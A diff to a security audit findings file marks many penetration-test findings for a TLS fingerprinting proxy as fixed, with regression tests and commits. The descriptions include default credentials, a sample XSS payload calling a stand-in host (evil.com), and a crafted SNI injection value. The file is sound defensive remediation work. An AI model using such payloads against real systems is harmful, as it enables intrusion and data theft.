@@ -427,14 +427,15 @@ findings:
   remediation_phases:
   - 118b
   - 117b
+  - 118o
   discovered: '2026-04-17'
   due: '2026-05-17'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on:
   - JA4PROXY-2026-0003
-  regression_test: ''
-  closed_commit: ''
+  regression_test: cmd/proxy/pentest_tls_protocol_lockdown_regression_test.go::TestRegression_JA4PROXY_2026_0011_non_tls_first_byte_is_dropped
+  closed_commit: 3cb562e8b62799b73e427f54cdabba5d92f53054
   description: 'Beyond the fragmentation bypass itself (0003), Phase 118b''s fix requires protocol lockdown:
     after reassembly, validate the first byte of payload is 0x16 (TLS Handshake). If not, drop connection
     immediately. Prevents HTTP smuggling, SSH injection, or subsequent PROXY header injection.'
@@ -530,13 +531,14 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - 119c
+  - 118p
   discovered: '2026-04-17'
   due: '2026-05-17'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: tests/unit/test_pentest_haproxy_stats_creds_regression.py::test_stats_auth_uses_fail_fast_env_syntax
+  closed_commit: 2d5c087de96f3c7de3619f5e4d83c78c7da359f7
   description: HAProxy stats page (port 8404) binds to all interfaces with fallback credentials admin:admin123
     if env vars unset (config/haproxy.cfg:37). Exposes backend server topology, IPs, and health status.
   notes: 'Phase 119c specifies fail-open: use `${HAPROXY_STATS_USER:?}:${HAPROXY_STATS_PASSWORD:?}` syntax
@@ -559,13 +561,14 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - 119d
+  - 118q
   discovered: '2026-04-17'
   due: '2026-05-17'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: tests/unit/test_pentest_cadvisor_unprivileged_regression.py::test_cadvisor_is_not_privileged
+  closed_commit: 1084021f312a5f465fa888bce55b35e3893f6898
   description: 'cAdvisor runs with privileged: true, mounts /:rootfs:ro, /var/run/var/run:rw, and has
     access to /dev/kmsg. If compromised, full host control via Docker socket in /var/run.'
   notes: 'Phase 119d specifies replacing privileged: true with specific caps (SYS_PTRACE, DAC_READ_SEARCH)
@@ -588,13 +591,14 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - 119e
+  - 118r
   discovered: '2026-04-17'
   due: '2026-05-17'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: tests/unit/test_pentest_promtail_socket_proxy_regression.py::test_promtail_does_not_mount_docker_socket
+  closed_commit: 2f7f6d7b0473789943cf080b9ed6c47f1be997ea
   description: Promtail mounts /var/run/docker.sock:ro (read-only). Even read-only, Docker API allows
     inspecting container env vars, leaking REDIS_PASSWORD, GRAFANA_PASSWORD, MANAGEMENT_JWT_SECRET.
   notes: Phase 119e specifies using Docker logging driver instead, or socket proxy (tecnativa/docker-socket-proxy)
@@ -617,13 +621,14 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - 119f
+  - 118s
   discovered: '2026-04-17'
   due: '2026-05-17'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: tests/unit/test_pentest_cicd_token_env_regression.py::test_jenkinsfile_does_not_pass_token_on_cli
+  closed_commit: 7ba079907cd8e5aa93c1b96c3d06ca313d6ce8e5
   description: Both Jenkins (deploy/jenkins/Jenkinsfile) and GitHub Actions (.github/workflows/ja4proxy-policy.yml)
     pass JA4PROXY_TOKEN directly on command line via string interpolation. Token appears in build logs,
     /proc/<pid>/cmdline, and shell history.
@@ -682,13 +687,14 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - 119h
+  - 118t
   discovered: '2026-04-17'
   due: '2026-05-17'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: management/tests/test_pentest_bans_table_xss_regression.py::test_source_does_not_interpolate_ip_inside_click_string_literal
+  closed_commit: 906b514aeea76b6a74d6fa1a675887419085ab00
   description: management/templates/partials/bans_table.html embeds {{ ban.ip }} inside Alpine.js @click
     handler in a JavaScript string literal. While Jinja2 HTML-escapes, Alpine.js @click directives may
     interpret decoded attribute values as JavaScript. A ban with IP containing `'); fetch('https://evil.com');//`
@@ -714,13 +720,14 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - 118e
+  - 118u
   discovered: '2026-04-17'
   due: '2026-05-17'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: management/tests/test_pentest_mgmt_rate_limit_redis_regression.py::test_distributed_workers_share_lockout_state
+  closed_commit: 8ce28f8c19569ad9aba5770e8ea3ec93e617fe2f
   description: management/api/auth.py implements login rate limiting using an in-memory dict (_login_failures).
     Distributed attacker can distribute brute-force across N instances (each gets 5 attempts). Restart
     clears all lockout state.
@@ -839,13 +846,14 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - 118d
+  - 118v
   discovered: '2026-04-17'
   due: '2026-06-16'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: tests/unit/test_pentest_env_file_never_committed_regression.py::test_env_file_has_never_appeared_in_git_history
+  closed_commit: 50b9802640aca93e2a7964ce4fca26fe17884a50
   description: '.env file contains real production credentials in git history: REDIS_PASSWORD, GRAFANA_PASSWORD,
     UI_API_KEY. Even though .gitignore''d, values persist in git history and are recoverable by anyone
     with repo access (including forks).'
@@ -867,14 +875,15 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - (none explicit; covered by 118c/118h metrics auth)
+  - 118bb
   discovered: '2026-04-17'
   due: '2026-06-16'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on:
   - JA4PROXY-2026-0008
-  regression_test: ''
-  closed_commit: ''
+  regression_test: cmd/proxy/pentest_metrics_rate_limit_regression_test.go::TestRegression_JA4PROXY_2026_0026_remote_is_throttled_after_burst
+  closed_commit: f2803ab
   description: '/health and /metrics endpoints lack rate limiting. Attacker spams endpoints: log flooding,
     Redis connection churn, Prometheus metric churn. DoS on observability.'
   notes: Related to 0008 (unauthenticated metrics). Adding auth (118h) implicitly solves this. If auth
@@ -898,13 +907,14 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - 118i
+  - 118x
   discovered: '2026-04-17'
   due: '2026-06-16'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: tests/unit/test_pentest_sni_redis_key_hash_regression.py::test_coordinated_burst_uses_hashed_sni_in_redis_key
+  closed_commit: 6ad2af596179e1c2889f2c3b67112941736ad01f
   description: Redis keys constructed using unsanitised SNI hostnames (src/security/behavioral.py:81,108).
     SNI contains colons, asterisks, question marks. Crafted SNI like evil.com:other_prefix:key_name creates
     cross-namespace key pollution. Key enumeration confusion and counter pollution.
@@ -928,13 +938,14 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - 118j
+  - 118z
   discovered: '2026-04-17'
   due: '2026-06-16'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: tests/unit/test_pentest_python_backend_timeout_regression.py::test_forward_to_backend_times_out_on_slow_backend
+  closed_commit: abf820d
   description: proxy.py:2702-2704 backend connection has no timeout. If backend unresponsive, handler
     coroutines block for OS TCP timeout (~2 minutes). Combined with slow backend under separate DDoS,
     all proxy connections exhaust event loop concurrency.
@@ -959,13 +970,14 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - 118l
+  - 118z
   discovered: '2026-04-17'
   due: '2026-06-16'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: tests/unit/test_pentest_log_sanitisation_regression.py::test_combined_attack_payload
+  closed_commit: 92526b2
   description: '_sanitize_log() (proxy.py:2140-2144) only strips \r and \n. Missing: null bytes (truncates
     log lines), ANSI escape sequences (\x1b[...], hides entries in terminal viewers), C0/C1 control characters.
     Additionally, JA4 from HTTP headers and SNI hostnames logged without sanitisation.'
@@ -989,13 +1001,14 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - 118m
+  - 118aa
   discovered: '2026-04-17'
   due: '2026-06-16'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: tests/unit/test_pentest_known_ja4_bounded_regression.py::test_caps_total_size_via_zremrangebyrank
+  closed_commit: c1e252d
   description: behavioral:known_ja4 Redis SET stores every unique JA4 fingerprint with no TTL/max size.
     Attacker sending randomised ClientHellos grows set at ~1 fingerprint/connection. 1M unique JA4s =
     50MB Redis memory, reached in ~3 hours at 100 conn/s.
@@ -1020,14 +1033,15 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - 118n
+  - 118cc
   discovered: '2026-04-17'
   due: '2026-06-16'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on:
   - JA4PROXY-2026-0012
-  regression_test: ''
-  closed_commit: ''
+  regression_test: cmd/proxy/pentest_xadd_backpressure_regression_test.go::TestRegression_JA4PROXY_2026_0031_enqueue_drops_when_full
+  closed_commit: e185eb1
   description: Every connection decision spawns goroutine calling p.redis.XAdd() with context.Background()
     (no timeout). If Redis slow, goroutines accumulate without bound, each holding JSON-marshaled event.
     At 1000 conn/s with 100ms Redis latency, ~100 goroutines accumulate per second.
@@ -1052,13 +1066,14 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - 118o
+  - 118z
   discovered: '2026-04-17'
   due: '2026-06-16'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: management/tests/test_pentest_oidc_alg_confusion_regression.py::test_alg_confusion_hs256_with_rsa_public_key_rejected
+  closed_commit: a0ae013
   description: management/api/routes/oidc.py:420 extracts ID token claims without verifying signature
     against IdP's JWKS endpoint. Security relies on HTTPS and client secret, but if token endpoint intercepted
     (compromised IdP, DNS hijack), attacker forges arbitrary claims including username and MFA status.
@@ -1083,13 +1098,14 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - 118p
+  - 118ii
   discovered: '2026-04-17'
   due: '2026-06-16'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: tests/unit/test_pentest_tls_parser_isolation_regression.py::test_parse_tls_task_does_not_setrlimit
+  closed_commit: 3ce47b9
   description: proxy.py:1279-1281 uses ThreadPoolExecutor (not ProcessPoolExecutor). Original used ProcessPoolExecutor
     for memory isolation — malformed TLS crash only kills child. With ThreadPoolExecutor, pathological
     Scapy parsing consumes unlimited memory in main proxy process.
@@ -1114,13 +1130,14 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - 119i
+  - 118y
   discovered: '2026-04-17'
   due: '2026-06-16'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: management/tests/test_pentest_jwt_role_default_regression.py::test_jwt_with_garbage_role_gets_auditor_not_admin
+  closed_commit: e92b9cb7209e550b7cb340122b1e4a273dd92a61
   description: management/api/auth.py:316-320 defaults unrecognised JWT role values to Role.admin (fail-open
     to max privilege). Tampered tokens with garbage role values escalate to admin access.
   notes: Phase 119i specifies defaulting to Role.auditor (lowest privilege) with warning log.
@@ -1143,13 +1160,14 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - 119j
+  - 118aa
   discovered: '2026-04-17'
   due: '2026-06-16'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: management/tests/test_pentest_dsar_bounded_xrange_regression.py::test_dsar_pages_stream_in_multiple_xrange_calls
+  closed_commit: ce4da33
   description: management/api/routes/compliance.py:389-393 calls await redis.xrange(_STREAM_KEY) with
     no count parameter. Entire events stream read into memory. For busy proxy with millions of entries,
     causes OOM.
@@ -1173,13 +1191,14 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - 119k
+  - 118hh
   discovered: '2026-04-17'
   due: '2026-06-16'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: tests/unit/security/test_pentest_burst_ipv6_regression.py::test_burst_fires_for_three_distinct_ipv6_addresses
+  closed_commit: 7a53d13
   description: src/security/behavioral.py:111,120 burst detection uses member = f"{ctx.client_ip}:{now_ms}"
     and later split(":")[0] to extract IP. For IPv6 addresses (2001:db8::1), splits on first colon, extracting
     only 2001. All IPv6 in same /16 appear as same IP.
@@ -1204,13 +1223,14 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - 119l
+  - 118jj
   discovered: '2026-04-17'
   due: '2026-06-16'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: internal/security/pentest_blocklist_single_check_regression_test.go::TestRegression_JA4PROXY_2026_0037_single_check_call_site
+  closed_commit: e3be0a77251ce255832542e304603a1e9128a793
   description: internal/security/pipeline.go:309-313,325-327 calls p.blocklists.Check() twice, discarding
     first result. Between calls, PubSub update could change blocklist state. Race condition on soft-block
     signal inclusion.
@@ -1231,13 +1251,14 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - 119s
+  - 118ll
   discovered: '2026-04-17'
   due: '2026-06-16'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: tests/unit/test_pentest_rate_limit_atomic_regression.py::test_check_rate_limit_calls_eval_exactly_once
+  closed_commit: d277b153d1a9b4b0f15145cc49d809c40d8090d3
   description: proxy.py:1093-1096 legacy _check_rate_limit uses separate INCR and EXPIRE calls (non-atomic).
     High concurrency can leave key without TTL, causing permanent rate limiting. rate_tracker.py Lua script
     handles this correctly but legacy path still called.
@@ -1259,17 +1280,22 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - 119t
+  - 118uu
   discovered: '2026-04-17'
   due: '2026-08-15'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: tests/unit/test_pentest_sensitive_filter_luhn_regression.py
+  closed_commit: 46db431ac8af7dc74328ee6332e952aefccb41f3
   description: proxy.py:2779-2781 credit card regex r"(\d{13,19})" matches Unix timestamps in milliseconds
     (13 digits), large counters, Redis keys. Operational log data corrupted with ***CARD_REDACTED***.
-  notes: Phase 119t specifies Luhn checksum validation before redacting. Only redact if digit sequence
-    passes Luhn.
+  notes: 'Phase 119t specifies Luhn checksum validation before redacting. Phase 118uu fix: added
+    _luhn_check() + _redact_card_if_luhn() helpers in proxy.py. The credit-card regex is now
+    word-boundary anchored and uses a callback substitution that returns the original digits
+    unchanged unless they satisfy the Luhn mod-10 checksum. Regression asserts (a) 11 real PAN
+    test vectors still redact, (b) timestamps, counters, all-nines strings pass through intact,
+    (c) a mixed line redacts only the card, (d) the args-path pass also uses the Luhn gate.'
 - id: JA4PROXY-2026-0040
   title: start-poc.sh Echoes Passwords to Console
   severity: LOW
@@ -1289,17 +1315,26 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - 118q
+  - 118rr
   discovered: '2026-04-17'
   due: '2026-08-15'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: tests/unit/test_pentest_start_scripts_password_echo_regression.py
+  closed_commit: 1bfe45dde5d57aa2b2381229ae4593d6f35afdd4
   description: scripts/start-poc.sh echoes Redis and Grafana passwords to stdout, appearing in terminal
     scrollback, CI logs, screen recordings.
   notes: 'Phase 118q specifies replacing password echo with confirmation messages (''Redis password: [generated]'')
-    without actual value.'
+    without actual value.
+    Phase 118rr fixed three scripts at once: scripts/start-poc.sh (echoed REDIS_PW/GRAFANA_PW
+    after generation), scripts/status.sh (echoed GRAFANA_PASS in the Access URLs banner), and
+    scripts/start-monitoring.sh (echoed GRAFANA_PASSWORD with the even worse ":-admin" default
+    embedded in the fallback). All three now render "[see .env]" placeholders plus a grep
+    recipe. Regression test regex scans for echo/printf lines that expand any variable whose
+    name ends in PASS/PASSWORD/PW/SECRET/TOKEN/KEY, with explicit $$VAR-literal exclusion, and
+    self-tests the regex against pre-fix and post-fix shapes to guard against a future
+    "simplification" that breaks detection.'
 - id: JA4PROXY-2026-0041
   title: Config Reload Path Hardcoded (Ignores CONFIG_PATH)
   severity: LOW
@@ -1319,16 +1354,23 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - 119m
+  - 118ss
   discovered: '2026-04-17'
   due: '2026-08-15'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: cmd/proxy/pentest_reload_respects_config_path_regression_test.go
+  closed_commit: 8f29dff6a0483e429f7bf4341b0ff16dc5ec6543
   description: cmd/proxy/main.go:593 reload() always loads "config/proxy.yml" regardless of CONFIG_PATH
     env var used at startup. SIGHUP reload loads different config than startup.
-  notes: Phase 119m specifies storing config path at startup, reusing in reload().
+  notes: 'Phase 119m specifies storing config path at startup, reusing in reload(). Phase 118ss
+    fix: newProxy() now accepts a cfgPath argument and stores it on proxy.cfgPath; reload() reads
+    from p.cfgPath with a fallback to "config/proxy.yml" when the field is empty (preserves
+    test-fixture behaviour for structs built via literal). Regression test has three guards —
+    runtime round-trip against a temp file, struct-literal round-trip on the cfgPath field, and a
+    source-scan regex that fails if a future edit reintroduces config.Load("config/proxy.yml")
+    inside the reload() body.'
 - id: JA4PROXY-2026-0042
   title: Redis Unix Socket Permissions 777
   severity: LOW
@@ -1349,16 +1391,23 @@ findings:
     notes: implied
   remediation_phases:
   - 119n
+  - 118oo
   discovered: '2026-04-17'
   due: '2026-08-15'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: tests/unit/test_pentest_redis_unixsocket_perm_regression.py
+  closed_commit: b4a9f1bb5012340ceec6040b48a331415bca6ae3
   description: deploy/docker/docker-compose.poc.yml and docker-compose.prod.yml Redis use --unixsocketperm
     777. Any container sharing redis-sock volume can connect without restriction.
   notes: Phase 119n specifies --unixsocketperm 770 with volume shared only by proxy/analytics containers.
+    Phase 118oo tightened both compose files to 770 and added group_add ['999'] to the prod proxy
+    service (POC proxy uses TCP, no group_add needed). The GID 999 is canonical — already pinned
+    in deploy/helm/ja4proxy/templates/redis.yaml and deploy/ansible/roles/redis-secure/tasks/main.yml.
+    Regression test pins 'others' octal digit to 0 in both files, pins group_add on prod proxy,
+    and pins that no non-redis service mounts redis-sock in POC (so a future mount cannot
+    silently open the hardening gap).
 - id: JA4PROXY-2026-0043
   title: Redis ACL Users All Share Same Password
   severity: LOW
@@ -1379,13 +1428,14 @@ findings:
     notes: implied
   remediation_phases:
   - 119o
+  - 118mm
   discovered: '2026-04-17'
   due: '2026-08-15'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: tests/unit/test_pentest_redis_acl_distinct_passwords_regression.py::test_distinct_per_user_passwords_apply
+  closed_commit: 3763ceacf762be2f457484d0aeb3dd8904cbbd2b
   description: scripts/redis-acl-setup.sh assigns same $REDIS_PASSWORD to all ACL users (proxy, analytics,
     admin). Single credential leak compromises all users.
   notes: Phase 119o specifies unique password per ACL user, distributed via Docker secrets.
@@ -1408,16 +1458,23 @@ findings:
     notes: implied
   remediation_phases:
   - 119p
+  - 118pp
   discovered: '2026-04-17'
   due: '2026-08-15'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: tests/unit/test_pentest_management_deps_pinned_regression.py
+  closed_commit: 970494ad70e81e47840c461f8bcad24e701016f9
   description: management/requirements.txt uses >= minimum pins with no upper bounds. Vulnerable to dependency
     confusion and malicious version upgrades.
   notes: Phase 119p specifies pinning exact versions or pip-compile to generate lockfile with hashes.
+    Phase 118pp replaced every '>=' with an '==' at the same minimum version previously tolerated,
+    closing the floating-version exposure without changing installed-version behaviour. The file
+    header names the finding ID so future editors see the rationale inline. Long-term target
+    remains pip-compile + '--require-hashes' (tracked for a later phase); exact pins remove the
+    primary exposure in the interim. Regression test rejects '>=', '~=', '>', '<', '!=' and
+    bare package names, forcing any future edit to either keep '==' or use an explicit URL/VCS pin.
 - id: JA4PROXY-2026-0045
   title: Grafana Bound to All Interfaces in Monitoring Stack
   severity: LOW
@@ -1438,16 +1495,21 @@ findings:
     notes: implied
   remediation_phases:
   - 119q
+  - 118nn
   discovered: '2026-04-17'
   due: '2026-08-15'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: tests/unit/test_pentest_grafana_loopback_bind_regression.py
+  closed_commit: e9bda6ad33b803d8ea1aa011f03b92630ad82070
   description: deploy/docker/docker-compose.monitoring.yml Grafana binds to 0.0.0.0:3001 while other services
     bind to 127.0.0.1. Exposes dashboards showing topology, bans, security state.
   notes: Phase 119q specifies '127.0.0.1:3001:3000'. Dashboard still accessible via SSH tunnel.
+    Phase 118nn applied the fix to BOTH docker-compose.monitoring.yml and docker-compose.prod.yml
+    (prod had the same '3001:3000' short form). Regression test parses both files and asserts
+    every Grafana port entry uses the explicit '127.0.0.1:HOST:CONTAINER' three-field short form,
+    plus pins the two files to identical bindings to prevent drift.
 - id: JA4PROXY-2026-0046
   title: K8s DaemonSet Missing Probes and NetworkPolicy
   severity: LOW
@@ -1468,17 +1530,27 @@ findings:
     notes: implied
   remediation_phases:
   - 119r
+  - 118qq
   discovered: '2026-04-17'
   due: '2026-08-15'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: tests/unit/test_pentest_helm_probes_and_networkpolicy_regression.py
+  closed_commit: 7170c7f3854bc1ed511b7816d2ea7ac9f5d5b048
   description: deploy/helm/ja4proxy/templates/daemonset.yaml missing liveness/readiness probes. Hung proxy
     pods continue receiving traffic. No NetworkPolicy restricts Redis and metrics port ingress.
   notes: Phase 119r specifies liveness/readiness probes on /health:9090, NetworkPolicy restricting Redis
     to proxy pods, proxy ingress from HAProxy only.
+    Phase 118qq added both probes to the DaemonSet (tuned so readiness drains faster than
+    liveness kills) and shipped a new templates/networkpolicy.yaml with two policies —
+    ja4proxy-ingress (port 8080 from configurable client labels/CIDRs, port 9090 only from
+    pods carrying metricsScrapeLabels, default Prometheus label) and ja4proxy-egress (DNS to
+    kube-dns, Redis to app=ja4proxy-redis pods, backend port to any destination because
+    NetworkPolicy cannot match FQDNs — a cluster-wide CiliumNetworkPolicy or firewall should
+    pin the upstream IP). networkPolicy.enabled defaults to True (secure-by-default);
+    operators running a cluster-wide controller can opt out cleanly. Regression test renders
+    with `helm template` and pins eight invariants.
 - id: JA4PROXY-2026-0047
   title: Redis TLS Binds to All Interfaces (Duplicate/Related to 0015)
   severity: MEDIUM
@@ -1495,13 +1567,14 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - (infrastructure hardening general)
+  - 118w
   discovered: '2026-04-17'
   due: '2026-06-16'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: tests/unit/test_pentest_redis_tls_bind_hardening_regression.py::test_redis_conf_pins_protected_mode_yes
+  closed_commit: 903f8b42e7d228e3126c5808d5699d69af8cd295
   description: deploy/docker/redis-tls/redis.conf binds to 0.0.0.0 -::*. With TLS, remote access possible
     if password compromised.
   notes: Recommend bind to Docker network only. Cross-referenced with 119n (socket perms) and 119o (ACL
@@ -1547,13 +1620,14 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - (no explicit phase; general credential hardening)
+  - 118dd
   discovered: '2026-04-17'
   due: '2026-06-16'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: internal/security/pentest_abuseipdb_key_hardening_regression_test.go::TestRegression_JA4PROXY_2026_0049_refuses_http_api_url
+  closed_commit: ae325eb
   description: internal/security/abuseipdb.go passes API key in HTTP header. If network compromised, key
     exposed.
   notes: 'Standard practice: HTTP headers vulnerable to MITM. Recommend HTTPS only (already likely) and
@@ -1573,13 +1647,14 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - (general Redis hardening; Phase 118d addresses subset)
+  - 118ff
   discovered: '2026-04-17'
   due: '2026-06-16'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: cmd/proxy/pentest_redis_acl_default_regression_test.go::TestRegression_JA4PROXY_2026_0050_warn_only_on_remote_disabled
+  closed_commit: f7de8a7
   description: 'config/proxy.yml acl_users.enabled: false (default off). Default user has full Redis access
     regardless of password.'
   notes: Phase 118d specifies Redis ACL configuration and documentation. Recommend enabling by default
@@ -1599,13 +1674,14 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - (no explicit phase; general secret hygiene)
+  - 118ee
   discovered: '2026-04-17'
   due: '2026-06-16'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: internal/webhook/pentest_secret_redaction_regression_test.go::TestRegression_JA4PROXY_2026_0051_fmt_sprintf_does_not_leak
+  closed_commit: 1b68920
   description: internal/webhook/delivery.go computes HMAC using secret string held in memory for process
     lifetime. Process compromise → secret exposure.
   notes: Standard concern for in-process secrets. Recommend no changes unless secrets-engine integration
@@ -1626,13 +1702,14 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - (general Redis hardening; Phase 119o per-user passwords related)
+  - 118gg
   discovered: '2026-04-17'
   due: '2026-06-16'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: internal/config/pentest_redis_user_enforcement_regression_test.go::TestRegression_JA4PROXY_2026_0052_validate_rejects_enabled_without_proxy_user
+  closed_commit: 4409cef
   description: config/proxy.yml ACL users configured but not enforced at runtime. Services don't use minimal-privilege
     accounts.
   notes: Phase 119o specifies unique passwords. Recommend enforcing separate Redis users for proxy vs.
@@ -1653,17 +1730,21 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - (no explicit phase; general log hygiene)
+  - 118tt
   discovered: '2026-04-17'
   due: '2026-08-15'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: management/tests/test_pentest_redis_password_log_leak_regression.py
+  closed_commit: 7c496d626630d16842f9df9289d92d07b08b9d65
   description: management/api/redis_client.py:70 may partially leak Redis password in connection error
     logs.
-  notes: 'Source document incomplete (cut off mid-sentence). Recommend: sanitise password from connection
-    strings in error logs.'
+  notes: 'Source document incomplete (cut off mid-sentence). Phase 118tt fix: introduced
+    _redact_redis_url() using urllib.parse.urlparse so the password field is masked regardless of
+    URL shape (bare, user+pass, password-with-@). init_redis() now logs only the redacted form on
+    success and on failure logs the redacted URL plus exception class name (never the exception
+    text, which can echo the raw URL back). Regression covers the helper + both init paths.'
 - id: JA4PROXY-2026-0054
   title: Configuration Path Traversal Prevention
   severity: MEDIUM
@@ -1680,13 +1761,14 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - 118l
+  - 118kk
   discovered: '2026-04-17'
   due: '2026-06-16'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: tests/unit/test_pentest_config_path_traversal_regression.py::test_rejects_parent_dir_traversal_mid_path
+  closed_commit: b7f6e0d3b16b909e41e286aed8f59b2a8d0fead8
   description: src/config/loader.py accepts config_path parameter without validation. Path traversal could
     allow read of sensitive files outside project root.
   notes: Phase 118l specifies Path().resolve() validation, ensuring config path within project root.
@@ -1706,13 +1788,14 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - 118k
+  - 118aa
   discovered: '2026-04-17'
   due: '2026-06-16'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: tests/unit/test_pentest_integration_tls_verification_regression.py::test_splunk_https_url_builds_verifying_context
+  closed_commit: 5ab69d3
   description: Splunk, Nagios, Dynatrace integrations use urllib without TLS certificate verification
     (deploy/integrations/splunk-ta/*, deploy/nagios/check_ja4proxy.py, deploy/dynatrace/ja4proxy-extension/plugin.py).
   notes: Phase 118k specifies ssl.create_default_context() for verified connections, with option for self-signed
